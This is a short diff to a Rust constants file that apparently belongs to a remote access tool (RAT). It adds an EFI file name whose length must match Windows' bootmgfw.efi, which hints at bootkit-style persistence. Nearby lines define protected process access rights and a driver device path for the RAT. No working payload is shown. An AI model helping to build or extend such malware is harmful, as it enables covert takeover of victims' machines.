@@ -21,6 +21,7 @@ pub const PROCESS_PROTECTED_ACCESS: u32 = PROCESS_CREATE_THREAD
 pub const THREAD_PROTECTED_ACCESS: u32 =
     THREAD_SET_CONTEXT | THREAD_SET_THREAD_TOKEN | THREAD_SUSPEND_RESUME | THREAD_TERMINATE;
 pub const DRIVER_USER_OBJECT: &U16CStr = u16cstr!(formatcp!("\\\\.\\{RAT_CLIENT_SERVICE_NAME}"));
+pub const RAT_EFI_FILE_NAME: &str = "violet04.efi"; // Must have the same length as bootmgfw.efi, or else will panic at runtime
 
 /// Port of the [`CTL_CODE`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/d4drvif/nf-d4drvif-ctl_code) macro.
 ///
